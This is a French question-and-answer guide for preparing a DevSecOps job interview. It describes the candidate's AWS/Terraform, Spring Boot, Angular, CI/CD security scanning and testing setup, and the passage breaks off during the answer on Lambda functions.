# Questions d'entretien — Portfolio DevSecOps

> Préparation aux questions techniques et comportementales d'un recruteur DevSecOps/Cloud.
> Basé sur le projet concret déployé sur https://charrad-devsecops.duckdns.org

---

## Architecture & Choix Techniques

### Q1 — Pourquoi avoir choisi Angular + Spring Boot + AWS pour ce portfolio ?

C'est une stack représentative des projets enterprise actuels. Angular est le framework dominant dans les DSI françaises pour les applications métier. Spring Boot avec Java 21 couvre les Virtual Threads et les projets Loom, ce qui est très demandé. AWS Free Tier permettait un déploiement réel sans coût pour un portfolio.

Le choix de séparer frontend et backend en containers distincts démontre aussi la maîtrise des architectures microservices et du découplage.

---

### Q2 — Expliquez l'architecture de votre infrastructure AWS.

L'infrastructure est entièrement décrite en code via Terraform (78 ressources). Elle comprend :

- **Réseau** : VPC avec subnets publics (EC2) et privés (RDS), Internet Gateway, pas de NAT Gateway (choix économique documenté : économise ~32$/mois)
- **Compute** : EC2 t3.small avec Docker Compose (backend, frontend, Redis, Prometheus, Grafana)
- **Base de données** : RDS PostgreSQL 15 en Single-AZ, subnets privés, SSL forcé, backups automatiques
- **Conteneurs** : ECR pour les images Docker, politiques de lifecycle (5 images tagguées conservées)
- **Serverless** : 3 Lambda (formulaire de contact, resize d'images, rapport hebdomadaire) + API Gateway
- **Secrets** : AWS Secrets Manager pour zéro secret en clair (Phase 21 — External Secrets Operator)
- **Observabilité** : CloudWatch (logs, alarmes, dashboard), Prometheus/Grafana sur l'EC2

---

### Q3 — Pourquoi Docker Compose plutôt que Kubernetes en production ?

J'ai d'abord implémenté K3s + ArgoCD (Phases 18-20) et ça fonctionne en local, mais sur un EC2 t3.micro (1GB RAM), la combinaison K3s + ArgoCD + Spring Boot saturait la mémoire physique et provoquait des crashs OOM. C'est une contrainte du Free Tier d'AWS.

En environnement entreprise, je déploierais sur EKS ou sur des nodes avec 4GB+ de RAM. Les manifests Kubernetes, le Helm chart et les configs ArgoCD sont dans le repo et fonctionnels — c'est documenté dans les Phases 18-21. Pour ce portfolio, Docker Compose était le compromis pragmatique pour avoir une URL publique stable.

---

### Q4 — Qu'est-ce que GitOps et comment l'avez-vous implémenté ?

GitOps, c'est le principe de traiter Git comme source unique de vérité pour les déploiements. Concrètement dans ce projet :

1. **ci-gitops.yml** : à chaque push sur main, GitHub Actions build l'image, la pousse sur ECR avec un tag SHA immuable (`sha-abc1234`), puis met à jour automatiquement `k8s/helm/values-dev.yaml` avec ce tag via un commit automatique.
2. **ArgoCD** scrute ce fichier values toutes les 3 minutes. Dès qu'il détecte un changement, il synchronise le cluster Kubernetes pour déployer la nouvelle version.
3. Résultat : aucun `kubectl apply` manuel, tout est traçable dans Git, rollback = revert d'un commit.

---

## DevSecOps & Sécurité

### Q5 — Que signifie DevSecOps pour vous et comment l'avez-vous appliqué ?

DevSecOps, c'est intégrer la sécurité à chaque étape du cycle de développement plutôt que de l'ajouter à la fin. Dans ce projet :

- **Dev** : SAST CodeQL dans le CI (analyse statique Java + TypeScript), Checkstyle pour les conventions
- **Sec** : OWASP Dependency Check (CVE sur les dépendances), OWASP ZAP DAST (scan dynamique de l'API), Trivy (vulnérabilités dans les images Docker), SBOM CycloneDX (inventaire des composants), Cosign (signature des images)
- **Ops** : CloudWatch alarmes sur les patterns brute-force (10 échecs d'auth/min), Secrets Manager pour zéro secret dans le code, SonarCloud Quality Gate (sécurité A, 84.2% couverture)

---

### Q6 — Comment gérez-vous les secrets dans ce projet ?

À plusieurs niveaux :

1. **Infrastructure** : `terraform.tfvars` est dans `.gitignore`, jamais committé. Les secrets sont dans AWS Secrets Manager (Phase 21) avec chiffrement KMS at-rest.
2. **CI/CD** : les secrets AWS, SSH, SonarCloud sont dans GitHub Secrets — jamais en clair dans les workflows.
3. **Runtime** : Spring Boot reçoit les secrets via variables d'environnement injectées au démarrage du container. External Secrets Operator (Kubernetes) synchronise depuis Secrets Manager vers des K8s Secrets automatiquement.
4. **Images Docker** : Trivy scan + Cosign signature pour garantir l'intégrité.

---

### Q7 — Qu'est-ce qu'un SBOM et pourquoi en avez-vous généré un ?

Un SBOM (Software Bill of Materials) est un inventaire exhaustif de tous les composants logiciels d'une application — équivalent d'une liste d'ingrédients. En cas de vulnérabilité critique (Log4Shell par exemple), on peut immédiatement savoir si on est impacté sans fouiller le code.

J'utilise CycloneDX : le workflow CI génère un SBOM en JSON et XML pour le backend (Maven) et le frontend (npm), et le publie dans GitHub Security. Les images Docker sont scannées par Trivy avec le même objectif.

---

## CI/CD & Automatisation

### Q8 — Décrivez votre pipeline CI/CD.

Le pipeline comprend 9 workflows GitHub Actions qui s'enchaînent sur chaque push :

```
push main
  ├── CI Backend       → Checkstyle → Tests (60) → JaCoCo → CodeQL → Docker build → ECR push
  ├── CI Frontend      → ESLint/Prettier → Tests Jest (57) → Docker build → ECR push  
  ├── SonarCloud       → Analyse qualité → Quality Gate (84.2% coverage)
  ├── Security Scans   → OWASP ZAP → Trivy filesystem → Dependabot
  ├── SBOM             → CycloneDX backend+frontend → Cosign signature
  ├── CI/CD GitOps     → Update values-dev.yaml avec le SHA → commit auto
  └── 🚀 Deploy        → SSH EC2 → docker pull backend+frontend → restart → health check
```

Total : ~8 minutes du push à la mise en production.

---

### Q9 — Comment garantissez-vous la qualité du code ?

Plusieurs niveaux de filets de sécurité :

- **Formatage** : Prettier (frontend) + Checkstyle (backend) — le pipeline échoue si non respecté
- **Tests** : 60 tests Java (unitaires + intégration Testcontainers), 57 tests Jest/Angular, coverage ≥ 55% JaCoCo côté backend
- **Analyse statique** : SonarCloud Quality Gate (reliability A, security A, coverage 84.2% sur nouveau code)
- **Sécurité** : CodeQL SAST, OWASP Dependency Check, Trivy
- **Conventions** : les PR (même auto-générées par GitOps) passent par tous ces checks

---

### Q10 — Qu'est-ce que Testcontainers et pourquoi l'utiliser ?

Testcontainers lance de vrais containers Docker pendant les tests d'intégration. Pour le backend, ça signifie tester contre un vrai PostgreSQL 15 (pas un mock H2 en mémoire) — les migrations Flyway sont jouées, les contraintes FK fonctionnent, les fonctions PostgreSQL-spécifiques aussi.

C'est plus lent qu'H2 mais beaucoup plus représentatif de la prod. En contrepartie, les tests unitaires Mockito restent rapides pour la logique métier pure.

---

## Observabilité

### Q11 — Quels outils d'observabilité avez-vous mis en place et pourquoi ?

J'ai mis en place les "trois piliers" de l'observabilité :

- **Métriques** : Prometheus scrape `/actuator/prometheus` de Spring Boot toutes les 15s. Métriques custom via Micrometer (`auth_login_failure_total`, `http_errors_total`). Grafana visualise avec 3 dashboards (Portfolio, Cache Redis, Kafka).
- **Logs** : Logback JSON structuré dans Spring Boot → CloudWatch Logs. Chaque log inclut `requestId`, `level`, `app`, `env`. CloudWatch Logs Insights permet des requêtes PromQL-like.
- **Alertes** : 3 alarmes CloudWatch (CPU > 80%, échecs auth > 10/min, erreurs 5xx > 5/min) avec notifications SNS par email.

---

### Q12 — Comment détectez-vous une tentative de brute-force ?

Deux niveaux :

1. **Applicatif** : Spring Security rejette les credentials invalides. `GlobalExceptionHandler` loggue en JSON avec un pattern reconnaissable. Micrometer incrémente le compteur `auth_login_failure_total`.
2. **Infrastructure** : Prometheus détecte `rate(auth_login_failure_total[1m]) > 10`. Une alarme CloudWatch sur la métrique `AuthLoginFailures` envoie un email via SNS si le seuil dépasse 10 échecs/minute.

---

## Cloud & Infrastructure

### Q13 — Comment avez-vous optimisé les coûts AWS ?

Plusieurs décisions documentées :

- **Pas de NAT Gateway** : économise ~32$/mois. L'EC2 est dans un subnet public avec SG restrictif, la RDS dans un subnet privé sans accès internet.
- **Single-AZ RDS** : Multi-AZ doublerait le coût. Acceptable pour un portfolio.
- **t3.small** vs instances plus grosses : suffisant pour le workload actuel.
- **ECR lifecycle policies** : maximum 5 images taggées conservées, images non-taggées supprimées après 1 jour.
- **Lambda pour le serverless** : facturation à la requête, $0 si peu d'appels.
- **Free Tier** : RDS db.t3.micro et les services Lambda/S3/API GW sont dans les limites Free Tier.

Coût total estimé : ~17.60$/mois (EC2 + Secrets Manager) couverts par les crédits AWS.

---

### Q14 — Pourquoi Terraform plutôt que des scripts bash ou la console AWS ?

Trois raisons fondamentales :

1. **Reproductibilité** : `terraform apply` sur un nouveau compte recréé exactement la même infra. Utile pour les environnements dev/staging/prod.
2. **State management** : Terraform garde l'état de l'infra et calcule uniquement le diff nécessaire. Pas de scripts bash qui échouent à mi-chemin sans rollback.
3. **Documentation vivante** : les fichiers `.tf` décrivent l'architecture aussi clairement qu'un diagramme, mais sont exécutables et vérifiables par code review.

Dans ce projet, 78 ressources AWS gérées en code, avec modules réutilisables (vpc, ec2, rds, ecr, lambda, cloudwatch, secrets-manager).

---

## Soft Skills & Méthodo

### Q15 — Quel a été le challenge le plus difficile de ce projet ?

Honnêtement, faire tourner Kubernetes sur un EC2 t3.micro. J'avais implémenté K3s + ArgoCD (qui sont dans le code et documentés), mais la combinaison K3s + ArgoCD + Spring Boot + Redis dépassait le gigaoctet de RAM disponible. Le serveur crashait sous la pression mémoire.

J'ai dû faire un choix pragmatique : passer en mode Docker Compose pour avoir un portfolio stable et démontrable, tout en conservant toute la config K3s/ArgoCD dans le code pour montrer la maîtrise technique. C'est la différence entre un projet académique (K3s sur papier) et un projet de production (Docker Compose qui fonctionne vraiment).

---

### Q16 — Comment avez-vous abordé la sécurité des credentials dans le pipeline CI/CD ?

Dès la conception, principe de zéro secret en clair :

- `terraform.tfvars` dans `.gitignore` avec des valeurs générées aléatoirement
- GitHub Actions utilise uniquement des Secrets chiffrés (jamais de valeurs en dur dans les workflows)
- Le GITOPS_TOKEN est un PAT GitHub dédié avec le scope minimum nécessaire
- L'EC2 utilise un IAM Instance Profile (pas de clés d'accès sur le serveur)
- Les images Docker sont scannées par Trivy avant le push ECR

Sur un projet d'équipe, j'ajouterais HashiCorp Vault ou une rotation automatique des secrets.

---

### Q17 — Comment expliquez-vous l'approche "App of Apps" d'ArgoCD ?

ArgoCD App of Apps est un pattern de méta-orchestration : une Application ArgoCD gère d'autres Applications ArgoCD.

Concrètement : `portfolio-app-of-apps` surveille le dossier `argocd/apps/` dans Git. Ce dossier contient les définitions des applications `portfolio-dev` et `portfolio-prod`. Quand ArgoCD synchronise `portfolio-app-of-apps`, il crée automatiquement les deux applications enfants qui déploient chacune le Helm chart sur leur namespace.

Avantage : ajouter un nouvel environnement = ajouter un fichier YAML dans `argocd/apps/`. Pas de commande `kubectl` manuelle. C'est du GitOps pur.

---

### Q18 — Quelle est la différence entre SAST et DAST, et comment les utilisez-vous ?

- **SAST** (Static Analysis Security Testing) : analyse le code source sans l'exécuter. Dans ce projet : CodeQL scanne le bytecode Java et le TypeScript compilé, détecte des patterns de vulnérabilités (injections, XSS, etc.) avant même le déploiement.

- **DAST** (Dynamic Analysis Security Testing) : teste l'application en cours d'exécution. Dans ce projet : OWASP ZAP lance des requêtes HTTP réelles contre l'API déployée, simule des attaques (injection SQL, traversée de répertoires, etc.) et vérifie les réponses.

Les deux sont complémentaires : SAST est rapide et trouve les erreurs de code, DAST trouve les problèmes de configuration runtime que le code seul ne révèle pas.

---

### Q19 — Si vous deviez refaire ce projet, que changeriez-vous ?

Trois choses :

1. **Tests d'intégration plus tôt** : j'aurais dû écrire les tests Testcontainers dès le début et non en Phase 8. Le coût d'une contrainte `NOT NULL` non testée = plusieurs heures de débogage en CI.

2. **Infrastructure plus grande dès le départ** : t3.micro pour K3s était une mauvaise décision d'optimisation prématurée. t3.small (2x la RAM, +8$/mois) aurait permis de garder K3s en production.

3. **HTTPS dès le départ** : configurer DuckDNS + Let's Encrypt en premier évite de corriger les CORS et les redirections HTTP→HTTPS après coup.

---

### Q20 — Qu'est-ce qu'un External Secrets Operator et pourquoi l'utiliser ?

External Secrets Operator (ESO) est un opérateur Kubernetes qui synchronise des secrets depuis des fournisseurs externes (AWS Secrets Manager, Vault, Azure Key Vault) vers des Kubernetes Secrets.

Sans ESO : vous devez créer les K8s Secrets manuellement (`kubectl create secret`), ce qui implique que les valeurs transitent par votre terminal ou un script.

Avec ESO : vous définissez en YAML "quel secret AWS, quels champs, vers quel namespace", et ESO s'occupe de la synchronisation toutes les 60 minutes. Le secret n'apparaît jamais dans Git, ni dans les logs CI/CD. Avantage supplémentaire : rotation automatique — si vous changez le secret dans AWS, ESO le met à jour dans Kubernetes sans redéploiement.

Dans ce projet, les secrets `portfolio/dev` et `portfolio/prod` dans AWS Secrets Manager contiennent les credentials DB, JWT secret et Redis host.

---

## Java 21 & Spring Boot

### Q21 — Quelles nouveautés de Java 21 avez-vous utilisées ?

Java 21 est une LTS (Long Term Support) avec plusieurs fonctionnalités clés :

- **Virtual Threads (Project Loom)** : Spring Boot 3.2+ les active automatiquement. Un thread virtuel coûte quelques centaines d'octets vs ~1MB pour un thread plateforme. Permet de gérer 100 000 connexions concurrentes sur un t3.small sans thread pool tuning.
- **Record patterns** (Java 21) : utilisés pour les DTOs immuables (`ProjectRequest`, `SkillResponse`). Un `record` génère automatiquement `equals`, `hashCode`, `toString` et les accesseurs.
- **Sealed classes** : non utilisées directement mais utiles pour modéliser des états finis.
- **Text blocks** : pour les requêtes SQL multilignes dans les repositories custom.

---

### Q22 — Expliquez le principe de JWT et comment vous l'implémentez.

JWT (JSON Web Token) est un token auto-porteur : il contient les claims (subject=email, rôle, expiration) signés par une clé secrète HMAC-SHA256. Le serveur n'a pas besoin de stocker de session.

Dans ce projet :
1. Le client envoie `POST /api/auth/login` avec email + password
2. Spring Security vérifie via `UserDetailsService` + BCrypt (coût 12)
3. `JwtTokenProvider` génère le token signé avec une clé 256-bit injectée via variable d'env
4. À chaque requête suivante, `JwtAuthenticationFilter` intercepte, valide le token, et injecte l'`Authentication` dans le `SecurityContextHolder`
5. Les endpoints publics (`GET /projects`, `GET /skills`) sont en `permitAll()`, les endpoints admin en `hasRole("ADMIN")`

---

### Q23 — Qu'est-ce que Flyway et pourquoi l'utiliser plutôt que `spring.jpa.hibernate.ddl-auto=create` ?

Flyway est un outil de migration de schéma de base de données versionné. Les fichiers `V1__create_users.sql`, `V2__create_projects.sql`, etc. s'exécutent dans l'ordre à chaque démarrage de l'application si la version cible est supérieure à la version actuelle.

`ddl-auto=create` recrée le schéma à chaque démarrage — catastrophique en production, vous perdez vos données. `ddl-auto=validate` vérifie la cohérence mais ne migre pas.

Flyway garantit : schéma versionné dans Git, migrations rejouables, historique des changements dans la table `flyway_schema_history`, rollback possible.

---

### Q24 — Qu'est-ce que `@Cacheable` et comment Redis est-il intégré ?

`@Cacheable("projects")` sur une méthode de service fait que Spring intercepte l'appel, vérifie Redis, et renvoie la valeur cachée si elle existe. Sinon, il exécute la méthode et stocke le résultat.

Dans ce projet :
- `ProjectService.getAllProjects()` → cache Redis avec TTL 5 minutes
- `SkillService.getAllSkills()` → cache 10 minutes (données rarement modifiées)
- `@CacheEvict` sur les méthodes d'écriture vide le cache concerné
- `CacheConfig` configure un `RedisCacheManager` avec `StringRedisSerializer` + `GenericJackson2JsonRedisSerializer`

Grafana visualise le hit/miss ratio via la métrique `cache.gets` de Micrometer.

---

### Q25 — Comment fonctionne `@Transactional` et quand l'utilisez-vous ?

`@Transactional` ouvre une transaction ACID au début de la méthode et la commit à la fin (ou rollback sur exception non-checked). Spring AOP intercepte l'appel via un proxy.

Règles appliquées dans ce projet :
- **`@Transactional(readOnly = true)`** sur les services de lecture : optimisation Hibernate (pas de dirty checking, requêtes éventuellement en mode read-only côté DB)
- **`@Transactional`** (lecture-écriture) sur les méthodes qui modifient des données
- **Propagation REQUIRED** par défaut : si une transaction existe déjà, on la réutilise
- **Piège évité** : pas d'appel interne entre méthodes `@Transactional` dans la même classe (le proxy AOP ne se déclenche pas)

---

### Q26 — Qu'est-ce que Micrometer et quel est son rôle dans ce projet ?

Micrometer est une façade de métriques pour JVM, comparable à SLF4J pour les logs. Il fournit une API unifiée qui permet de changer le backend (Prometheus, Datadog, CloudWatch) sans changer le code.

Dans ce projet :
- **Auto-métriques Spring Boot** : `http.server.requests`, `jvm.memory.used`, `hikaricp.connections.active` exposées sur `/actuator/prometheus`
- **Métriques custom** (`AppMetrics`) : `auth_login_success_total`, `auth_login_failure_total`, `http_errors_total` avec tags (status code, path)
- Prometheus scrape toutes les 15s, Grafana visualise avec des dashboards pré-provisionnés

---

### Q27 — Comment avez-vous sécurisé les endpoints de l'API ?

Plusieurs couches de sécurité :

1. **HTTPS** : tout le trafic est chiffré (Let's Encrypt, NGINX)
2. **JWT stateless** : pas de session côté serveur
3. **RBAC** : `@PreAuthorize("hasRole('ADMIN')")` sur les endpoints d'écriture, `permitAll()` sur les lectures publiques
4. **Validation des inputs** : `@Valid` + `@NotBlank`, `@Size`, contraintes Bean Validation. Le `GlobalExceptionHandler` renvoie des 400 structurés sans exposer le stack trace
5. **CORS** : restreint aux origines connues via `SecurityConfig.corsConfigurationSource()`
6. **Headers de sécurité** : Spring Security ajoute automatiquement `X-Content-Type-Options`, `X-Frame-Options`, etc.
7. **Rate limiting** : détection via Prometheus (alerte brute-force) — un vrai rate limiter serait la prochaine évolution

---

### Q28 — Expliquez le rôle de Kafka dans ce projet.

Kafka (Phase 10) est utilisé pour les événements métier asynchrones en mode KRaft (sans ZooKeeper depuis Kafka 2.8).

Flux implémentés :
- **ProjectCreatedEvent** : quand un admin crée un projet, le service publie sur le topic `portfolio.projects.created`. Un consumer loggue l'événement pour audit.
- **UserLoginEvent** : chaque connexion réussie publie sur `portfolio.users.login`

Avantages : découplage entre l'action utilisateur et le traitement asynchrone (logs d'audit, notifications futures, analytics). En production enterprise, ces events alimenteraient ElasticSearch ou un data lake.

---

### Q29 — Quelle est la différence entre `@RestController` et `@Controller` ?

`@RestController` = `@Controller` + `@ResponseBody` sur toutes les méthodes. Chaque méthode sérialise automatiquement le retour en JSON (via Jackson) sans besoin d'annoter chaque méthode.

`@Controller` est pour les applications web MVC traditionnelles qui renvoient des vues (Thymeleaf, JSP). Dans une API REST pure comme ce projet, `@RestController` est toujours utilisé.

---

### Q30 — Comment gérez-vous les erreurs HTTP dans l'API ?

Un `GlobalExceptionHandler` (`@RestControllerAdvice`) centralise la gestion :
- `ResourceNotFoundException` → 404 avec message structuré
- `MethodArgumentNotValidException` → 400 avec liste des erreurs de validation par champ
- `AccessDeniedException` → 403
- `AuthenticationException` → 401
- `Exception` (catch-all) → 500 avec message générique (sans stack trace exposé)

Chaque réponse suit le format `ApiResponse<T>` : `{ success: false, data: null, errors: [...] }`. Ce format uniforme simplifie le traitement côté Angular.

---

## Angular & Frontend

### Q31 — Pourquoi Angular 21 et pas React ou Vue ?

Angular est un framework opinionné avec une structure imposée (modules, services, DI, routing). C'est une force dans un contexte enterprise : tous les développeurs Angular écrivent du code structuré de la même façon.

React est une librairie, ce qui nécessite de choisir soi-même routing, state management, etc. Vue est un bon compromis mais moins présent dans les grandes entreprises françaises.

Dans ce portfolio, Angular 21 démontre aussi la maîtrise des Signals (remplaçant progressif de RxJS pour la gestion d'état local), `@if`/`@for` (nouvelle syntaxe template), et le mode `zoneless` (ChangeDetectionStrategy.OnPush).

---

### Q32 — Qu'est-ce que le lazy loading et pourquoi l'utilisez-vous ?

Le lazy loading découpe le bundle JavaScript en chunks chargés à la demande. Au lieu d'un fichier `main.js` de 2MB, le navigateur charge uniquement le code nécessaire pour la page affichée.

Dans ce projet, chaque feature Angular (`portfolio`, `admin`, `auth`) est un module lazy-loaded via `loadChildren(() => import('./features/...')`. Le bundle initial est réduit à ~100KB, améliorant le TTI (Time To Interactive).

---

### Q33 — Expliquez les Signals Angular et pourquoi ils remplacent progressivement RxJS.

Les Signals (Angular 16+) sont des valeurs réactives qui notifient automatiquement les consumers quand elles changent. Comparés à RxJS :

- **Simpler** : `const count = signal(0); count.set(1); count.update(v => v + 1)` vs `BehaviorSubject` + `async pipe` + `takeUntil`
- **Performance** : Change Detection granulaire — seul le composant qui utilise le signal est re-rendu
- **Computed** : `const doubled = computed(() => count() * 2)` se met à jour automatiquement

Dans ce projet, `HomeComponent`, `SkillsComponent` et `DashboardComponent` utilisent des Signals pour `isLoading`, `error`, et les données. Pas de `subscribe/unsubscribe` à gérer.

---

### Q34 — Comment fonctionne l'intercepteur JWT côté Angular ?

`JwtInterceptor` (`HttpInterceptorFn`) intercepte chaque requête HTTP sortante. Si un token est stocké dans `StorageService`, il ajoute l'header `Authorization: Bearer <token>`.

`ErrorInterceptor` intercepte les réponses : sur 401, il vide le storage et redirige vers `/auth/login` avec le `returnUrl`. Sur 403, il redirige vers l'accueil.

Ce pattern évite de répéter la gestion d'auth dans chaque service Angular.

---

### Q35 — Comment gérez-vous la protection des routes côté Angular ?

`AuthGuard` (fonctionnel, `CanActivateFn`) vérifie `authService.isAuthenticated()`. Si false, redirige vers `/auth/login` avec `returnUrl`. `AdminGuard` vérifie en plus `authService.isAdmin()`.

Les routes publiques (`/portfolio`, `/skills`) n'ont pas de guard. Les routes admin (`/admin/**`) ont `canActivate: [adminGuard]`. L'URL `/auth/login` est accessible sans auth.

---

## Docker & Containers

### Q36 — Comment avez-vous optimisé vos images Docker ?

Plusieurs techniques appliquées :

- **Multi-stage build** pour le backend : stage 1 `maven:3.9-eclipse-temurin-21` compile le JAR, stage 2 `eclipse-temurin:21-jre-alpine` ne contient que le JRE (~180MB vs ~500MB)
- **Multi-stage build** pour le frontend : stage 1 `node:24-alpine` build Angular, stage 2 `nginx:alpine` (~25MB) sert les fichiers statiques
- **`.dockerignore`** : exclut `node_modules`, `target`, `.git`, `.angular`
- **Layers ordering** : `COPY pom.xml` + `mvn dependency:resolve` avant `COPY src` pour maximiser le cache Docker

Résultat : image backend ~200MB, image frontend ~25MB.

---

### Q37 — Quelle est la différence entre `COPY` et `ADD` dans un Dockerfile ?

`ADD` peut décompresser des archives tar et télécharger des URLs. `COPY` fait uniquement une copie locale.

Bonne pratique : toujours utiliser `COPY` sauf si on a besoin de décompression automatique. `ADD` est moins prévisible et peut introduire des comportements inattendus.

---

### Q38 — Qu'est-ce que `depends_on` dans docker-compose et suffit-il pour garantir l'ordre de démarrage ?

`depends_on` garantit l'ordre de **création des containers** mais pas que le service soit **prêt à répondre**. Redis démarre en quelques secondes, mais Spring Boot prend 30-60 secondes.

Pour attendre qu'un service soit prêt, il faut `depends_on` avec `condition: service_healthy` et un `healthcheck` défini. Dans ce projet, le frontend `depends_on: backend: condition: service_healthy`. La healthcheck vérifie `/actuator/health/readiness` de Spring Boot.

---

### Q39 — Pourquoi avoir un container Redis séparé plutôt qu'un Redis embarqué ?

Redis embarqué (comme Embedded Redis pour les tests) n'est pas recommandé en production :
1. **Isolation** : le cache Redis survit aux redémarrages du backend
2. **Scalabilité** : si on scale le backend en plusieurs instances, toutes partagent le même cache Redis
3. **Monitoring** : les métriques Redis sont distinctes des métriques applicatives
4. **Ressources** : Redis peut être configuré indépendamment (maxmemory, eviction policy)

Pour les tests, Testcontainers lance un Redis éphémère — comportement identique à la prod sans état partagé.

---

### Q40 — Comment fonctionne ECR et pourquoi ne pas utiliser Docker Hub ?

ECR (Elastic Container Registry) est le registre privé AWS. Avantages vs Docker Hub :
- **Sécurité** : intégration IAM native (l'EC2 pull via son Instance Profile, pas de credentials)
- **Performances** : réseau AWS interne, pull quasi-instantané depuis EC2
- **Coût** : 500MB/mois gratuit (Free Tier), suffisant pour ce portfolio
- **Scanning** : scan de vulnérabilités automatique à chaque push
- **Lifecycle policies** : suppression automatique des vieilles images

Le token ECR expire toutes les 12h — un cron job sur l'EC2 le renouvelle toutes les 6h.

---

## Tests

### Q41 — Quelle est votre stratégie de tests ?

Je suis la pyramide de tests :

- **Tests unitaires** (base, nombreux, rapides) : Mockito pour les services, Jest pour les composants Angular. Ils testent la logique métier isolément.
- **Tests d'intégration** (milieu) : Testcontainers pour tester les repositories avec un vrai PostgreSQL. `@WebMvcTest` pour tester les controllers avec le contexte Spring complet.
- **Tests E2E** (sommet, peu nombreux, lents) : Cypress pour les 3 scénarios critiques (auth, admin, portfolio). k6 pour les tests de charge.
- **Tests de sécurité** : OWASP ZAP DAST sur l'API déployée.

60 tests backend, 57 tests frontend, 84.2% de couverture sur le nouveau code.

---

### Q42 — Qu'est-ce que JaCoCo et comment l'avez-vous configuré ?

JaCoCo (Java Code Coverage) instrumente le bytecode pour mesurer quelles lignes sont exécutées pendant les tests. Il génère des rapports HTML et XML.

Configuration dans ce projet :
- Plugin Maven `jacoco-maven-plugin` dans `pom.xml`
- Exclusions : entités Lombok, mappers, `BackendApplication.java` (code généré ou bootstrapping)
- Seuil minimal : 55% de coverage sur les lignes (abaissé de 70% car les Phases 17-21 ont ajouté du code sans tests correspondants)
- Le rapport XML est consommé par SonarCloud pour le Quality Gate

---

### Q43 — Comment avez-vous testé les scénarios de sécurité (401, 403) ?

Dans `ProjectControllerTest` avec `@WebMvcTest` + Spring Security réel (non mocké) :

```java
@Test
void shouldReturn401WhenNoToken() {
    mockMvc.perform(get("/projects/1"))
        .andExpect(status().isUnauthorized());
}

@Test
@WithMockUser(roles = "USER") // pas ADMIN
void shouldReturn403WhenNotAdmin() {
    mockMvc.perform(post("/projects").content(...))
        .andExpect(status().isForbidden());
}
```

Le `@WithMockUser` injecte un `Authentication` dans le `SecurityContextHolder` sans passer par le JWT filter.

---

### Q44 — Qu'est-ce que Cypress et en quoi diffère-t-il de Selenium ?

Cypress est un framework E2E moderne qui s'exécute **dans** le navigateur (pas via WebDriver comme Selenium). Avantages :
- Pas de timing issues : Cypress attend automatiquement les éléments DOM
- Accès direct au réseau : intercepter/mocker des requêtes HTTP avec `cy.intercept()`
- Débogage visuel : time-travel debugger avec screenshots à chaque étape
- Rapide : pas de driver HTTP entre le test et le navigateur

Dans ce projet, 3 scénarios : login admin, création de projet, consultation portfolio public.

---

### Q45 — Comment fonctionnent les tests de charge k6 ?

k6 est un outil de load testing écrit en Go avec des scripts JavaScript. Il simule des utilisateurs virtuels (VUs) qui exécutent des scénarios HTTP.

Scénarios implémentés :
- **Smoke test** : 5 VUs pendant 1 minute (vérification que l'app répond)
- **Load test** : montée progressive à 50 VUs sur 10 minutes (charge normale)
- **Stress test** : 200 VUs pendant 5 minutes (pic de charge)

Métriques clés : p95 response time < 500ms, error rate < 1%. Les résultats sont publiés en Job Summary GitHub Actions.

---

### Q46 — Comment avez-vous géré l'isolation des tests d'intégration avec Flyway ?

Problème : Flyway V4 insère des données seed (admin, 2 projets) dans le container PostgreSQL Testcontainers. Ces données persistent entre les tests et faussent les `assertThat().hasSize()`.

Solution : `@BeforeEach` exécute du SQL via `JdbcTemplate` pour vider les tables dans l'ordre des FK :
```java
jdbcTemplate.execute("DELETE FROM project_skills");
jdbcTemplate.execute("DELETE FROM projects");
jdbcTemplate.execute("DELETE FROM users");
```
Puis recrée un `testUser` propre pour chaque test.

---

### Q47 — Quelle est la différence entre un mock, un stub et un spy ?

- **Mock** (Mockito `@Mock`) : objet factice qui vérifie qu'une méthode a été appelée (`verify()`). Retourne null/0 par défaut.
- **Stub** (`given(...).willReturn(...)`) : configure ce que le mock retourne pour un appel donné. Pas de vérification d'appel.
- **Spy** (`@Spy`) : enveloppe un vrai objet — les méthodes non stubées s'exécutent vraiment.

Usage dans ce projet : `@Mock ProjectRepository` + stubs pour les services, `@InjectMocks ProjectService` pour tester la logique métier sans Spring Context.

---

### Q48 — Comment avez-vous testé les composants Angular avec `@WebMvcTest` côté backend ?

`@WebMvcTest(ProjectController.class)` charge uniquement la couche web Spring (controller, security, serialization). Pas de DB, pas de services réels.

Il faut `@MockBean` pour toutes les dépendances du controller + les beans de sécurité (JwtTokenProvider, UserDetailsService, AppMetrics). L'`@Import(SecurityConfig.class)` charge la vraie configuration de sécurité pour tester les 401/403.

`MockMvc` simule les requêtes HTTP en mémoire — rapide et sans port réseau.

---

## AWS Services

### Q49 — Qu'est-ce qu'un VPC et pourquoi en avez-vous créé un ?

Un VPC (Virtual Private Cloud) est un réseau privé isolé dans AWS. Sans VPC, toutes vos ressources seraient sur le réseau public AWS partagé.

Dans ce projet, le VPC `10.0.0.0/16` contient :
- **Subnets publics** (10.0.1.0/24, 10.0.2.0/24) : EC2 accessible depuis internet
- **Subnets privés** (10.0.10.0/24, 10.0.11.0/24) : RDS sans accès internet direct

L'Internet Gateway connecte les subnets publics à internet. Les Security Groups font office de firewall par ressource.

---

### Q50 — Expliquez le principe d'IAM Role vs IAM User.

Un **IAM User** a des credentials permanents (Access Key + Secret Key). Risque : ces clés peuvent être leakées dans du code ou des logs.

Un **IAM Role** est une identité temporaire assumée par un service AWS. Pas de credentials permanents. L'EC2 assume le rôle `portfolio-dev-ec2-role` via un Instance Profile — il obtient des tokens STS temporaires renouvelés automatiquement toutes les heures.

Dans ce projet, l'EC2 peut appeler `ecr:GetAuthorizationToken`, `logs:PutLogEvents`, etc. sans avoir de clés AWS en dur dans le code ou la configuration.

---

### Q51 — Qu'est-ce qu'un Security Group et en quoi diffère-t-il d'un NACL ?

Un **Security Group** est un firewall stateful au niveau de l'instance : les connexions établies sont automatiquement autorisées en retour. Opère au niveau de l'ENI.

Un **NACL** (Network ACL) est un firewall stateless au niveau du subnet : les règles entrantes et sortantes sont indépendantes, il faut explicitement autoriser le retour.

Dans ce projet, seuls les Security Groups sont utilisés :
- `ec2-sg` : ports 80/443 (HTTP/HTTPS) depuis 0.0.0.0/0, port 22 (SSH) ouvert pour le CI/CD
- `rds-sg` : port 5432 uniquement depuis `ec2-sg` (pas depuis internet)

---

### Q52 — Comment fonctionnent les Lambda Functions de ce projet ?

Trois Lambda serverless (Phase 15) :

1. **Contact Form** : déclenché par API Gateway (POST /contact) → valide les inputs → envoie un email via SES → retourne 200. Pas de serveur, facturation à la requête.

